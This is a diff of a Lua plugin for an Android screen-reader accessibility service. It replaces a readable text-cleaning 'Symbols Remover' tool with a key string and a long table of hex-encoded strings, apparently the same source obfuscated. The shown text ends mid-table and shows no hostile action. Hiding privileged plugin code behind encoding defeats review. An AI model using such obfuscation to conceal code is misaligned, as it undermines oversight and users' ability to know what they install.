@@ -1,394 +1,90 @@
-require "import"
--- STARTUP_SOUND_INJECTOR_START
-pcall(function()
-    if startup_sound_mp ~= nil then
-        pcall(function() startup_sound_mp.release() end)
-    end
-    local MediaPlayer = luajava.bindClass("android.media.MediaPlayer")
-    local File = luajava.bindClass("java.io.File")
-    startup_sound_mp = luajava.new(MediaPlayer)
-    
-    local sound_path = ""
-    local roots = {"/storage/emulated/0/解说/Plugins/", "/sdcard/解说/Plugins/"}
-    local target_name = "SYMBOLS REMOVER CREATED BY A BROTHERS"
-    local exts = {".mp3", ".aac", ".wav", ".ogg", ".m4a"}
-    
-    for _, r in ipairs(roots) do
-        for _, e in ipairs(exts) do
-            local path_to_test = r .. target_name .. "/" .. target_name .. e
-            if luajava.new(File, path_to_test).exists() then
-                sound_path = path_to_test
-                break
-            end
-        end
-        if sound_path ~= "" then break end
-    end
-    
-    if sound_path == "" then
-        pcall(function()
-            local d_path = debug.getinfo(1).source:match("@?(.*)")
-            if d_path and d_path:find("/") then
-                local s_dir = d_path:match("(.+)/[^/]+")
-                for _, e in ipairs(exts) do
-                    local path_to_test = s_dir .. "/" .. target_name .. e
-                    if luajava.new(File, path_to_test).exists() then 
-                        sound_path = path_to_test 
-                        break
-                    end
-                end
-            end
-        end)
-    end
-    
-    if sound_path ~= "" then
-        startup_sound_mp.setDataSource(sound_path)
-        startup_sound_mp.setOnCompletionListener(luajava.createProxy("android.media.MediaPlayer$OnCompletionListener", {
-            onCompletion = function(mediaPlayer)
-                pcall(function() 
-                    mediaPlayer.release() 
-                    startup_sound_mp = nil
-                end)
-            end
-        }))
-        startup_sound_mp.prepare()
-        startup_sound_mp.start()
-    end
-end)
--- STARTUP_SOUND_INJECTOR_END
-import "android.widget.*"
-import "android.view.*"
-import "android.app.*"
-import "android.content.*"
-import "android.os.*"
-import "android.text.*"
-import "android.graphics.Typeface"
-import "android.net.Uri"
-
--- سیشن ویری ایبلز
-local totalDots, totalCommas, totalLines, totalEmojis, totalNumbers, totalSymbols = 0, 0, 0, 0, 0, 0
-local lastCleanText = ""
-local lastSettingsHash = ""
--- اناؤنسمنٹ ٹریکر
-local sessionReported = {emoji=false, num=false, sym=false, dot=false, comma=false, line=false}
-
-local function showSymbolRemover()
-    local cm = service.getSystemService(Context.CLIPBOARD_SERVICE)
-    local pref = service.getSharedPreferences("A_BROTHERS_PREFS", Context.MODE_PRIVATE)
-    local editPref = pref.edit()
-    
-    local keepSpecial = pref.getBoolean("keep_special_state", false)
-    local keepEmoji = pref.getBoolean("keep_emoji_state", true)
-    local keepNumbers = pref.getBoolean("keep_numbers_state", true)
-    local keepSymbols = pref.getBoolean("keep_symbols_state", true)
-    local announceState = pref.getBoolean("announce_state", true)
-    local masterState = pref.getBoolean("master_state", true)
-    
-    local scrollView = ScrollView(service)
-    scrollView.setFillViewport(true)
-    
-    local mainLayout = LinearLayout(service)
-    mainLayout.setOrientation(LinearLayout.VERTICAL)
-    mainLayout.setPadding(35, 35, 35, 35)
-    mainLayout.setBackgroundColor(0xFFFFFFFF)
-    scrollView.addView(mainLayout)
-
-    local titleText = TextView(service)
-    titleText.setText("SYMBOLS REMOVER CREATED BY A BROTHERS")
-    titleText.setGravity(Gravity.CENTER)
-    titleText.setTextSize(18)
-    titleText.setTextColor(0xFF000000)
-    titleText.setTypeface(Typeface.DEFAULT_BOLD)
-    mainLayout.addView(titleText)
-
-    local editBox = EditText(service)
-    editBox.setHint("Paste or type text here...")
-    editBox.setGravity(Gravity.TOP)
-    editBox.setBackgroundColor(0xFFF5F5F5)
-    editBox.setMinLines(10)
-    editBox.setHorizontallyScrolling(false)
-    editBox.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_FLAG_MULTI_LINE)
-    
-    local lpEdit = LinearLayout.LayoutParams(-1, -2)
-    lpEdit.setMargins(0, 10, 0, 5)
-    editBox.setLayoutParams(lpEdit)
-    mainLayout.addView(editBox)
-
-    local infoLayout = LinearLayout(service)
-    infoLayout.setOrientation(LinearLayout.HORIZONTAL)
-    mainLayout.addView(infoLayout)
-
-    local limitText = TextView(service)
-    limitText.setText("0 / 20000")
-    limitText.setTextColor(0xFF777777)
-    limitText.setPadding(0, 0, 10, 0)
-    infoLayout.addView(limitText)
-
-    local removedStatusText = TextView(service)
-    removedStatusText.setText("Removed 0 symbols 0 dots 0 commas 0 lines 0 numbers 0 emojis")
-    removedStatusText.setTextColor(0xFFFF5722)
-    removedStatusText.setTextSize(10)
-    removedStatusText.setTypeface(Typeface.DEFAULT_BOLD)
-    infoLayout.addView(removedStatusText)
-
-    local function updateCounts()
-        local txt = tostring(editBox.getText())
-        limitText.setText(string.format("%d / 20000", utf8.len(txt) or 0))
-    end
-
-    editBox.addTextChangedListener(TextWatcher{onTextChanged = function() updateCounts() end})
-
-    local function addBtn(text, color)
-        local b = Button(service)
-        b.setText(text)
-        b.setBackgroundColor(color)
-        b.setTextColor(0xFFFFFFFF)
-        local lpBtn = LinearLayout.LayoutParams(-1, -2)
-        lpBtn.setMargins(0, 5, 0, 5)
-        b.setLayoutParams(lpBtn)
-        mainLayout.addView(b)
-        return b
-    end
-
-    addBtn("Paste Text", 0xFF4CAF50).onClick = function()
-        local clip = cm.getPrimaryClip()
-        if clip and clip.getItemCount() > 0 then
-            editBox.setText(tostring(clip.getItemAt(0).getText()))
-            sessionReported = {emoji=false, num=false, sym=false, dot=false, comma=false, line=false}
-            service.speak("Pasted")
-        end
-    end
-    
-    local btnToggle = addBtn("", 0xFFFF9800)
-    local btnEmojiToggle = addBtn("", 0xFF00BCD4)
-    local btnSymToggle = addBtn("", 0xFF009688)
-    local btnNumToggle = addBtn("", 0xFF3F51B5)
-    local btnMaster = addBtn("REMOVE EMOJIS NUMBERS AND SYMBOLS", 0xFF673AB7) 
-
-    local function refreshToggle()
-        btnToggle.setText(keepSpecial and "REMOVE DOTS COMMAS AND LINES ON" or "REMOVE DOTS COMMAS AND LINES OFF")
-        btnToggle.setBackgroundColor(keepSpecial and 0xFFE65100 or 0xFFFF9800)
-    end
-
-    local function refreshEmojiToggle()
-        btnEmojiToggle.setText(keepEmoji and "REMOVE EMOJIS ON" or "REMOVE EMOJIS OFF")
-        btnEmojiToggle.setBackgroundColor(keepEmoji and 0xFF0097A7 or 0xFF00BCD4)
-    end
-
-    local function refreshSymToggle()
-        btnSymToggle.setText(keepSymbols and "REMOVE SYMBOLS ON" or "REMOVE SYMBOLS OFF")
-        btnSymToggle.setBackgroundColor(keepSymbols and 0xFF00796B or 0xFF009688)
-    end
-
-    local function refreshNumToggle()
-        btnNumToggle.setText(keepNumbers and "REMOVE ALL NUMBERS ON" or "REMOVE ALL NUMBERS OFF")
-        btnNumToggle.setBackgroundColor(keepNumbers and 0xFF1A237E or 0xFF3F51B5)
-    end
-
-    local function refreshMaster()
-        btnMaster.setText("REMOVE EMOJIS NUMBERS AND SYMBOLS " .. (masterState and "ON" or "OFF"))
-        btnMaster.setBackgroundColor(masterState and 0xFF4527A0 or 0xFF673AB7)
-    end
-
-    refreshToggle()
-    refreshEmojiToggle()
-    refreshSymToggle()
-    refreshNumToggle()
-    refreshMaster()
-
-    local btnAnnounceToggle = addBtn("", 0xFF795548)
-    local function refreshAnnounceToggle()
-        btnAnnounceToggle.setText(announceState and "VOICE REPORT MODE ON" or "VOICE REPORT MODE OFF")
-        btnAnnounceToggle.setBackgroundColor(announceState and 0xFF4E342E or 0xFF795548)
-    end
-    refreshAnnounceToggle()
-
-    btnToggle.onClick = function()
-        keepSpecial = not keepSpecial
-        editPref.putBoolean("keep_special_state", keepSpecial).commit()
-        refreshToggle()
-        service.speak(keepSpecial and "Special removal enabled" or "Special removal disabled")
-    end
-
-    btnEmojiToggle.onClick = function()
-        keepEmoji = not keepEmoji
-        editPref.putBoolean("keep_emoji_state", keepEmoji).commit()
-        refreshEmojiToggle()
-        service.speak(keepEmoji and "Emoji removal enabled" or "Emoji removal disabled")
-    end
-
-    btnSymToggle.onClick = function()
-        keepSymbols = not keepSymbols
-        editPref.putBoolean("keep_symbols_state", keepSymbols).commit()
-        refreshSymToggle()
-        service.speak(keepSymbols and "Symbols removal enabled" or "Symbols removal disabled")
-    end
-
-    btnNumToggle.onClick = function()
-        keepNumbers = not keepNumbers
-        editPref.putBoolean("keep_numbers_state", keepNumbers).commit()
-        refreshNumToggle()
-        service.speak(keepNumbers and "Numbers removal enabled" or "Numbers removal disabled")
-    end
-
-    btnMaster.onClick = function()
-        masterState = not masterState
-        keepEmoji, keepNumbers, keepSymbols = masterState, masterState, masterState
-        editPref.putBoolean("master_state", masterState)
-        editPref.putBoolean("keep_emoji_state", keepEmoji)
-        editPref.putBoolean("keep_numbers_state", keepNumbers)
-        editPref.putBoolean("keep_symbols_state", keepSymbols).commit()
-        refreshEmojiToggle()
-        refreshNumToggle()
-        refreshSymToggle()
-        refreshMaster()
-        service.speak(masterState and "Master removal enabled" or "Master removal disabled")
-    end
-
-    btnAnnounceToggle.onClick = function()
-        announceState = not announceState
-        editPref.putBoolean("announce_state", announceState).commit()
-        refreshAnnounceToggle()
-        service.speak(announceState and "Voice report enabled" or "Voice report disabled")
-    end
-
-    local btnClean = addBtn("Deep Clean and Copy", 0xFF2196F3)
-    local btnClear = addBtn("CLEAR TEXT AND RESET STATS", 0xFFF44336)
-    local btnAbout = addBtn("About", 0xFF9C27B0)
-    local btnHelp = addBtn("Help and Feedback", 0xFF25D366)
-    local btnExit = addBtn("EXIT", 0xFF607D8B)
-
-    local dialog = AlertDialog.Builder(service).setView(scrollView).setCancelable(false).create()
-    dialog.getWindow().setType(WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY)
-    dialog.show()
-
-    btnClean.onClick = function()
-        local rawText = tostring(editBox.getText())
-        if rawText == "" then service.speak("Text box is empty") return end
-
-        if not (keepSpecial or keepEmoji or keepNumbers or keepSymbols) then
-            service.speak("Please turn on at least one option first")
-            return
-        end
-
-        local currentSettings = tostring(keepSpecial)..tostring(keepEmoji)..tostring(keepNumbers)..tostring(keepSymbols)
-        
-        local needsReport = false
-        if keepEmoji and not sessionReported.emoji then needsReport = true end
-        if keepNumbers and not sessionReported.num then needsReport = true end
-        if keepSymbols and not sessionReported.sym then needsReport = true end
-        if keepSpecial and (not sessionReported.dot or not sessionReported.comma or not sessionReported.line) then needsReport = true end
-
-        if rawText == lastCleanText and currentSettings == lastSettingsHash and not needsReport then
-            service.speak("Already clean")
-            cm.setPrimaryClip(ClipData.newPlainText("clean", rawText))
-            return
-        end
-
-        service.speak("Scanning")
-        task(400, function()
-            local resultTable = {}
-            local cDot, cComma, cLine, cEmoji, cNum, cSym = 0, 0, 0, 0, 0, 0
-            
-            for char in rawText:gmatch("[%z\1-\127\194-\244][\128-\191]*") do
-                local shouldRemove = false
-                local isEmoji = char:match("[\240-\243][\128-\191][\128-\191][\128-\191]") or char:match("[\226-\227][\128-\191][\128-\191]")
-                
-                if isEmoji then 
-                    if keepEmoji then shouldRemove = true; cEmoji = cEmoji + 1 end
-                elseif char:match("%d") then 
-                    if keepNumbers then shouldRemove = true; cNum = cNum + 1 end
-                elseif char == "." then 
-                    if keepSpecial then shouldRemove = true; cDot = cDot + 1 end
-                elseif char == "," or char == "،" then 
-                    if keepSpecial then shouldRemove = true; cComma = cComma + 1 end
-                elseif char == "\n" or char == "\r" then 
-                    if keepSpecial then shouldRemove = true; cLine = cLine + 1 end
-                elseif char:match("[%a\216-\219\161-\191]") or char == " " then 
-                    shouldRemove = false
-                else 
-                    if keepSymbols then shouldRemove = true; cSym = cSym + 1 end
-                end
-
-                if not shouldRemove then table.insert(resultTable, char) end
-            end
-            
-            local cleanText = table.concat(resultTable)
-            cleanText = cleanText:gsub("^ +", ""):gsub(" +$", "")
-
-            totalDots, totalCommas, totalLines, totalEmojis, totalNumbers, totalSymbols = totalDots+cDot, totalCommas+cComma, totalLines+cLine, totalEmojis+cEmoji, totalNumbers+cNum, totalSymbols+cSym
-            removedStatusText.setText(string.format("Removed %d symbols %d dots %d commas %d lines %d numbers %d emojis", totalSymbols, totalDots, totalCommas, totalLines, totalNumbers, totalEmojis))
-            
-            editBox.setText(cleanText)
-            cm.setPrimaryClip(ClipData.newPlainText("clean", cleanText))
-            
-            if announceState then
-                local report = {}
-                if keepEmoji and not sessionReported.emoji then
-                    table.insert(report, cEmoji .. " emojis")
-                    sessionReported.emoji = true
-                end
-                if keepNumbers and not sessionReported.num then
-                    table.insert(report, cNum .. " numbers")
-                    sessionReported.num = true
-                end
-                if keepSymbols and not sessionReported.sym then
-                    table.insert(report, cSym .. " symbols")
-                    sessionReported.sym = true
-                end
-                if keepSpecial then
-                    if not sessionReported.dot then table.insert(report, cDot .. " dots"); sessionReported.dot = true end
-                    if not sessionReported.comma then table.insert(report, cComma .. " commas"); sessionReported.comma = true end
-                    if not sessionReported.line then table.insert(report, cLine .. " lines"); sessionReported.line = true end
-                end
-                
-                if #report > 0 then
-                    local finalMsg = "Text cleaning successfully. " .. table.concat(report, ", ") .. " removed. Text copied to clipboard successfully"
-                    service.speak(finalMsg)
-                else
-                    service.speak("Already clean. Text copied to clipboard successfully")
-                end
-            else
-                service.speak("Text copied to clipboard successfully")
-            end
-            
-            lastCleanText, lastSettingsHash = cleanText, currentSettings
-        end)
-    end
-
-    btnClear.onClick = function() 
-        local currentBoxText = tostring(editBox.getText())
-        if currentBoxText == "" then 
-            service.speak("Text box is already empty")
-            return 
-        end
-        
-        editBox.setText("")
-        totalDots, totalCommas, totalLines, totalEmojis, totalNumbers, totalSymbols = 0, 0, 0, 0, 0, 0
-        lastCleanText, lastSettingsHash = "", ""
-        sessionReported = {emoji=false, num=false, sym=false, dot=false, comma=false, line=false}
-        removedStatusText.setText("Removed 0 symbols 0 dots 0 commas 0 lines 0 numbers 0 emojis")
-        service.speak("Cleared and stats reset successfully") 
-    end
-
-    btnAbout.onClick = function()
-        local aboutMsg = "This extension is developed by A BROTHERS TEAM to help you clean your text easily. It is a very simple and powerful extension that removes all unwanted symbols, emojis, and numbers from your sentences. Sometimes text looks very messy with too many dots, commas, or icons, and this extension makes it clean and professional with just one click. It uses a smart system that remembers what it has already cleaned, so it only tells you about new things. Our team created this extension for people who want high-quality text without any manual work. Thank you for using our extension."
-        local adb = AlertDialog.Builder(service)
-        adb.setTitle("SYMBOLS REMOVER")
-        adb.setMessage(aboutMsg)
-        adb.setPositiveButton("OK", nil)
-        local ad = adb.create()
-        ad.getWindow().setType(WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY)
-        ad.show()
-    end
-
-    btnHelp.onClick = function()
-        local waMsg = "Hello A BROTHERS TEAM, I have been using your 'Symbols Remover' extension and I am genuinely impressed by its seamless performance and precision. The advanced features and user-friendly interface make it a top-tier tool for text optimization. I would love to discuss its impressive functionality with you and share some detailed feedback on my experience."
-        local intent = Intent(Intent.ACTION_VIEW, Uri.parse("https://api.whatsapp.com/send?phone=923477583735&text=" .. Uri.encode(waMsg)))
-        intent.setPackage("com.whatsapp").addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-        pcall(function() service.startActivity(intent) dialog.dismiss() end)
-    end
-
-    btnExit.onClick = function() dialog.dismiss() end
+-- Created by A Brothers
+local k = "804"
+local c = {
+    "aa95a5ad99a69d5056a19da4a7a2a85a3a616550878c71868c85849783838d7e789779828275778c7f8697838879828842a097999ca06096a9a693a8a19fa260593e58505458999a58a3a899a2a8ada093ab9fa9a69493a5a054b66d54a699a058a49c9d9e3e5850545850545850a49b91a0a4589aad9e97ac99a3a6585d58a3a899a2a8ada093ab9fa9a69493a5a062aa95a09d91a79d585d5895a29c593e5850545895a29c3a54585054a49f97999c54859598a19184a491ad9da2547550a0ad919e99a69566929da69477a491a7ab5856999e98aa9f9d9c5ea19d949d995e819d949d9980a099a999aa525d4250545850a0a79395a4507aa1",
+    "9c99586d54a4a595a291aa995e96a19e987b9c95aba35c5a9a95ae9162a19f627e99a09d525d4250545850a7ac91a6aca5a497a3a3ad9e98979da4586d54a4a595a291aa995ea29da75c859598a19184a491ad9da25d42505458503e585054589ca39b91a058a3a3ad9e9897a095ac98547550565a3a54585054a49f97999c54aa9fa3aca3547550af5a5fa7ac9fa69997996795a1ad9c95ac959867606320d7d720dfe86780a0ad979da6a3635a5c545a5fa79c9395aa946320d7d720dfe86780a0ad979da6a3635aad3e585054589ca39b91a058a495aa9799ac8fa2999d99586d545aa3ada592a3a4a354aa95a1a7a699aa5097aa9595ac95",
+    "985892ad5871549aa2a3ac9899aaa3564250545850a0a79395a45099b0a4a7586d54b35262a5a0675a5c545a5e9599935664505666a795ae5260585262a7979b5a5c545a5ea16c9156b53a5458505442505458509aa7a254975c54aa509da6509da8919daaa35caa9fa3aca35d5894a34250545850545850549e9fa6588f60589554a19e54a1a095a1a2a76095acaca35d5894a3425054585054585054585054589ca39b91a058a095ac9893ac9f93ac95a7ac507158a254665e54ac91a69f95a8979e95a59554665e545a5f56585e6258a495aa9799ac8fa2999d99585e6258953e585054585054585054585054a19654a4a595a291aa995ea2",
+    "9da75c7e99a09d5c54a891a8a08fa8a78fa89da3a8615e99b099a7aca35c6150a8a095a24250545850545850545850545850545850a7a7a5a29c8fa499a49c586d54a891a8a08fa8a78fa89da3a8425054585054585054585054585054585096aa9595a33a54585054585054585054585099a6943e585054585054585099a6943e58505458505458509d9e50a7a7a5a29c8fa499a49c58ae7158525658a49c9d9e549aa299999b549d9e98425054585099a6943e585054583a54585054a19654ab9fa9a69493a891a8a050717550565a50a8a095a2425054585054585054a89395a49c5c9ea5a29ba49da79e5c613a5458505458505458505458",
+    "50a0a79395a4509897a095ac98547550989d92a99f5e9b9da49da696a360615d66a3a3ada2979d6aa199a497a05856786f5c665a5d5a593e585054585054585054585054a196549c8fa499a49c5891a29c509897a095ac986e9e99a29c585667525d58a49c9d9e3e585054585054585054585054585054589ca39b91a058a3939c99a6586d549c8fa499a49c729d95ac939c60525c665b5d678b92678d5f5a593e5850545850545850545850545850545896a3aa50936450995899a25899a49999a6ab5899b0a4a7615098a73a54585054585054585054585054585054585054589ca39b91a058a095ac9893ac9f93ac95a7ac507158a3939c99",
+    "a6585e625852635a50626650a899a29b9da493a691a19d5062665099425054585054585054585054585054585054585054a19654a4a595a291aa995ea29da75c7e99a09d5c54a891a8a08fa8a78fa89da3a8615e99b099a7aca35c6150a8a095a2583a545850545850545850545850545850545850545850545850a7a7a5a29c8fa499a49c586d54a891a8a08fa8a78fa89da3a8583a54585054585054585054585054585054585054585054585096aa9595a33a545850545850545850545850545850545850545895a29c3a545850545850545850545850545850549d9e984250545850545850545850545895a29c3a545850545850545895a2",
+    "9c593e5850545895a29c3a5458505442505458509d9e50a7a7a5a29c8fa499a49c58ae7158525658a49c9d9e3e5850545850545850a7ac91a6aca5a497a3a3ad9e98979da466a399ac7495ac9187a7a5a69b955cab9fa9a69493a891a8a0593e5850545850545850a7ac91a6aca5a497a3a3ad9e98979da466a399ac7fa27b9fa1a89c99ac99a3a67c9daba499a695a6609ca9999a95ae91629ba29999a49988a2a3b0a95c5a91a29ca2a3a19462a59598a19162859598a19184a491ad9da258879e77a79da4a495a8a19fa28499a7ac95a29da2566450af425054585054585054585054589fa27b9fa1a89c99ac99a3a650715896a9a693a8a1",
+    "9fa2609d999c9995889c95b195a6613a54585054585054585054585054585054a89395a49c5c9ea5a29ba49da79e5c61503e5850545850545850545850545850545850545850a19d949d9980a099a999aa5ea69d9c9999a399605954425054585054585054585054585054585054585054aba495aaa4a9a88fa7a7a5a29c8fa1a85071589e9da43a545850545850545850545850545850549d9e98613a54585054585054585054585099a6943e5850545850545850b161593e5850545850545850a7ac91a6aca5a497a3a3ad9e98979da466a0a69da095aa955c613a5458505458505458a3a899a2a8ada093ab9fa9a69493a5a062aba495aaa4",
+    "5c613a545850549d9e984295a29c593e655d548b84758a8489888f878785827c8f7d867a797b84838a8f7986743ea19da4a7a2a8585295a694a6a7999866a79d9c9799ac5e5e5a3a9da5a0a3aaa4545a91a29ca2a3a19462ae9999af5e5e5a3a9da5a0a3aaa4545a91a29ca2a3a1946299a0a4665a564299a1a89fa6ac5056999e98aa9f9d9c5e97a79ea89d9ea8665a564299a1a89fa6ac5056999e98aa9f9d9c5ea3ab5e5e5a3a9da5a0a3aaa4545a91a29ca2a3a19462ac95acac5e5e5a3a9da5a0a3aaa4545a91a29ca2a3a194629fa295a8989d9ba3628ca9a49d96959b95564299a1a89fa6ac5056999e98aa9f9d9c5ea29da4628da29d",
+    "5a3a3e655d5410e30fc408e811b65411b80fc408e513bc5410d70fc408dc11b40cea3aa0a79395a450a8a7a495a474a3aca36058a4a3ac91a07b9fa1a591a76450a8a7a495a47c9da695a76450a8a7a495a475a1a79a9dab5c54ac9fa8999c82ad9d969da2a76450a8a7a495a483ada592a3a4a354755064645064645064645064645064645064429ca39b91a0589c95aba477a49595a68499b0a4547550565a3aa0a79395a450a099a3a88b95a8ac99a29fa37c99a39c586d545a523e655d5410d70dbe08db10d40dbe08e711b50dbe09ed5809ed10e10fc40add10e13ea49f97999c54ab95a7ab99a3a68299a89fa6ac9598586d54b395a1a7",
+    "9a9d759695a4a3996450a2ad9d719e91a0ab956058a3ada56d9a999ca79d5c549c9fa8759695a4a399645097a79da1996d9a999ca79d5c54a499a29d6d9a999ca79dad3e429ca39b91a05896a9a693a8a19fa258a39ca7a787b19d96a79c869d9da3ae95a660593e585054589ca39b91a05893a1586d54ab95a6ae99979d5e9b9da487b1a3a89d9d879da2aaa193996073a3a6a499b0a4627b7c7d8872837982789783798a867d7b755d4250545850a0a79395a450a4aa959a586d54ab95a6ae99979d5e9b9da487a091a69d9484aa959a9da299a69399ab5856798f768a7f888075868b8f848a757a8b52605873a3a6a499b0a462857f787d8f",
+    "848a798a798479613a54585054a49f97999c549d949dac80a69d96547550a4aa959a669598a1a45c613a545850544250545850a0a79395a4509f9d95a48ba0999b9995a4507158a0a69d96629f95a87a9fa3a49595a65856a39599a88fa7a89597a191a097a3a899a4995a5c549e91a0ab955d4250545850a0a79395a4509f9d95a47d9da3a299547550a4aa959a669799ac72a3a79c99999e5c5a9b999da0939d9da3a29993aba495ac95566450a8aaa599613a54585054a49f97999c54a39599a87ea9a59299aaa3547550a4aa959a669799ac72a3a79c99999e5c5a9b999da093a6a5a19a95a6ab8fa7ac91a89d526058a4a6ad955d425054",
+    "5850a0a79395a4509f9d95a48ba9a19a9fa0ab507158a0a69d96629f95a87a9fa3a49595a65856a39599a88fa7b19d96a79ca797a3a899a4995a5c54aca2a99d593e585054589ca39b91a05891a2a69fa9a693998ba495ac95547550a4aa959a669799ac72a3a79c99999e5c5a91a2a69fa9a6939997a3a899a4995a5c54aca2a99d593e585054589ca39b91a0589d95aba499aa83a899a499586d54a8a2999e5e9b9da476a79fa09d91a26052a199a3a89da293aba495ac95566450a8aaa599613a545850544250545850a0a79395a450a79ba2a3a49c8aa195ab586d548b93a6a79ca08e9999af58a79da2aaa19399613a54585054ab93a6a7",
+    "9ca08e9999af5ea79da47aa19ca08e9999afa0a3aaa45caca2a99d593e585054583a54585054a49f97999c54a5919da67c95b19fa9ac5071587c9da69595aa7c95b19fa9ac58a79da2aaa19399613a54585054a5919da67c95b19fa9ac5ea79da483aa9999a6a495ac99a3a65880a19e9999a28099a9a3ada4628e75868c7977797c5d4250545850a19999a28491ada7a5a866a399ac80959c949da6975c6b65605863696450676d5c546b655d4250545850a19999a28491ada7a5a866a399ac72959b9b9baa9fa9a69477a79ca3aa5864b0767a7e767a7e767a613a54585054ab93a6a79ca08e9999af5e959c948aa195ab609d95a19e8099a9",
+    "a3ada45d423a54585054a49f97999c54ac99a8a495889da8a8586d548c95acac869d9da75cab95a6ae99979d593e58505458a49dac9c998c95acac5ea79da4889da8a86052a7b19d96a79ca758a299a59faa9da2549ba29999a4999c5096b150755892a6a7a49c9da2a75a593e58505458a49dac9c998c95acac5ea79da47baa91aaa1a4ad6077a699a69daca9627b75828c7586613a54585054ac99a8a495889da8a866a399ac8499b0a487a1aa9960616c613a54585054ac99a8a495889da8a866a399ac8499b0a477a79ca3aa5864b0767a686064686064613a54585054ac99a8a495889da8a866a399ac84ada8959a9993996084ada8959a",
+    "9993996674797e71898484937a7f807c593e585054589d95a19e8099a9a3ada4629994988e9999af58a8a1a4a09d8499b0a45d423a54585054a49f97999c549d949dac72a3b05071587598a1a4889da8a860a399aaa69d9b955d4250545850999c99a87a9fac66a399ac789da6a45c5a8095aba499589fa658a4ada89554ac95acac509c9da299665e625a593e585054589598a1a476a7a862ab95a87fa295ae99a8b1587baa91aaa1a4ad66848388593e585054589598a1a476a7a862ab95a87a9197a397a6a7a5a29c73a3a49fa66060ac7e767a6d76697e655d4250545850999c99a87a9fac66a399ac7d9da67c9da695a7606164613a5458",
+    "50549d949dac72a3b05ea79da47ca7a29db29fa2ac91a0a4a9879ba2a3a49c9da6975c9e91a0ab955d4250545850999c99a87a9fac66a399ac79a2a8a5a88ca9a49d587da6a0a9ac84ada895628c89847d8f778471878b8f887d888858ac54819ea4ada488b1a09966848d8875938c758c8c8f7a84717b977d8984847d977c7d86755d42505458503e585054589ca39b91a0589ca47d949dac5071587c9da69595aa7c95b19fa9ac5e8099a9a3ada48499a295a5a35c656160585d66613a54585054a4a0799c99a866a399ac7d95aa979da6a35c685c5469606058606058655d4250545850999c99a87a9fac66a399ac7c95b19fa9ac8095aa91",
+    "a1ab58a0a87598a1a45d4250545850a19999a28491ada7a5a86691989c869d9da75c9d949dac72a3b0593e4250545850a0a79395a4509da696a38491ada7a5a8586d548499a29d91a68491ada7a5a860a399aaa69d9b955d42505458509da696a38491ada7a5a866a399ac7fa6a195a2ac91a8a19fa2607c9da69595aa7c95b19fa9ac5e7c87827d927f828c7180613a54585054a5919da67c95b19fa9ac5e959c948aa195ab6099a29e9f8099a9a3ada45d423a54585054a49f97999c54a499a1a1a4889da8a8586d548c95acac869d9da75cab95a6ae99979d593e585054589c9da599a88c95acac5ea79da4889da8a8605264585f546a6064",
+    "686056613a54585054a499a1a1a4889da8a866a399ac8499b0a477a79ca3aa5864b0767a6f676b6f676b613a54585054a499a1a1a4889da8a866a399ac80959c949da6975c685c54685c5469606058605d42505458509da696a38491ada7a5a86691989c869d9da75ca499a1a1a4889da8a8613a3e585054589ca39b91a058a299a59faa9d9487ac91a8ada3889da8a8586d548c95acac869d9da75cab95a6ae99979d593e58505458a299a59faa9d9487ac91a8ada3889da8a866a399ac8499b0a45c5a8299a59faa9d94546850a7b19d96a79ca75860549c9fa8ab50645893a3a59d95ab5064589c9da695a7586054a6a5a19a95a6ab506458",
+    "95a1a79a9dab525d4250545850a69d9da3ae95988ba495aca5a78c95acac5ea79da4889da8a87b9fa0a7a25c68a87a7e767a6d67666a593e58505458a299a59faa9d9487ac91a8ada3889da8a866a399ac8499b0a487a1aa99606164613a54585054aa95a1a7a6999c83a899a4a9ab8499b0a462ab95a88ca9a49d96959b955c8ca9a49d96959b95627c757a7985808c8f76877c78613a54585054a19e9aa77c95b19fa9ac5e959c948aa195ab60a299a59faa9d9487ac91a8ada3889da8a8613a3e585054589ca39b91a05896a9a693a8a19fa258a5a49c91a89d73a3ad9ea8ab585d425054585054585054a49f97999c54aca8a8586d54ac9f",
+    "a7aca29da6975c9d949dac72a3b05e9b9da4889da8a860595d425054585054585054a499a1a1a4889da8a866a399ac8499b0a45caba4a6a19e9b6696a3aa9d95ac58565d945467506668606468526058a5a89e6862a495a260a4acac5954a7a25468595d425054585099a6943e4250545850999c99a87a9fac6691989c8499b0a477a091a29f95988499a7ac95a29da25c8c95acac8795ac939c9da2afa79e889da8a87b9895a697999c50715896a9a693a8a19fa2605954ada09899a4997b9fa9a6a4a76059549d9e98b5593e4250545850a0a79395a4509aad9e97ac99a3a650959c9476ac9e5cac95acac5c549b9fa0a7a25d425054585054",
+    "585054a49f97999c549a50715872a9aca4a3a658a79da2aaa19399613a54585054585054589262ab95a88c95acac58a89da8a8613a54585054585054589262ab95a87a9197a397a6a7a5a29c73a3a49fa66093a3a49fa6613a54585054585054589262ab95a88c95acac73a3a49fa66060ac7e767a7e767a7e765d425054585054585054a49f97999c54a4a076ac9e54755080a19e9999a28099a9a3ada4628491ada7a5a88891a6999da7605d656450616a593e5850545850545850a0a872a8a65ea79da48199a29ba19ea760606058656058606058655d4250545850545850549a5ea79da48099a9a3ada48499a295a5a35ca4a076ac9e5d42",
+    "5054585054585054a5919da67c95b19fa9ac5e959c948aa195ab60925d425054585054585054aa95a8ada2a258923e5850545895a29c3a3e5850545891989c72a8a658568891a7ac95548c95acac52605860ac7e76687b717a6d605d669fa27b9c9d9b9b5475509aad9e97ac99a3a6585d425054585054585054a49f97999c549b9c9da850715893a1669799ac80a6a19d95aaa977a499a460593e58505458505458509d9e5097a499a45891a29c5097a499a4669799ac79a89d9d77a7a5a2ac585d586e546850a8a095a2425054585054585054585054589598a1a476a7a862ab95a88c95acac58a8a7a3a8aa99a29f5897a499a4669799ac79",
+    "a89d9d75ac5864615e9b9da4889da8a860595d613a545850545850545850545850a79da3a7a19fa28a95a4a7a2a89d94547550af9d9da3a299719e91a0ab9560589ea9a56d9a999ca79d5c54aba9a1759695a4a399645098a7a4719e91a0ab95605893a3a59d95759695a4a3996450a0a19e99759695a4a399b53a545850545850545850545850a79da2aaa1939966a3a49d919f60528499a3a89d9456613a545850545850545895a29c3a545850549d9e9842505458503e585054589ca39b91a05892a8a684a39f97a09d50715891989c72a8a658565a5c5468a87a7e767a71686468593e585054589ca39b91a05892a8a675a1a79a9d8c9f9b",
